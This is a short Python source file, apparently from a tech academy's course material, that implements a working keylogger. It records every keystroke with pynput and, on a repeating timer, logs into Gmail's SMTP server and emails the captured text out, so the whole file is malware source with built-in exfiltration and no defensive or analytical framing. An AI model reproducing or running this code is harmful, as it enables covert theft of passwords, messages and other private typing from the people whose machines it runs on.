""" Keylogger
Python3
BAJWA TECH ACADEMY
"""

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, timer_value, email, password):
        self.log=""
        self.timer=timer_value
        self.email=email
        self.password=password

    def key_press_function(self, key):
        self.log = self.log + str(key)

    def send_report(self):
        print(self.log)
        self.email_send(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.timer, self.send_report)
        timer.start()

    def email_send(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # BAJWA ACADEMY
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press_function)
        with keyboard_listener:
            self.send_report()
            keyboard_listener.join()
